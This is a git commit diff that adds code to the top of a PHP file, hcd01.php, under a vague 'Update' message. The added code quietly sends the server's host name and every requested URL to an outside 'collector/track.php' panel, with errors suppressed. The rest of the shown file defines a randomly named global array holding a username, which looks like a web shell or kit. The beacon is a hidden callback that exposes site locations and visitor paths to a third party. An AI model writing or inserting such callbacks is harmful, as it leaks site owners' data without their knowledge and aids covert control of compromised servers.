751b14793d3812afa110fde7696f6966ef217fb8
sam <144790923+tryxapp@users.noreply.github.com>
2025-10-13 20:02:23 +0700

    Update hcd01.php

--- newcon1/newcon2/oncon/hcd01.php
+++ newcon1/newcon2/oncon/hcd01.php
@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://panel.trixygame.com/admin/collector/track.php';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'kt',
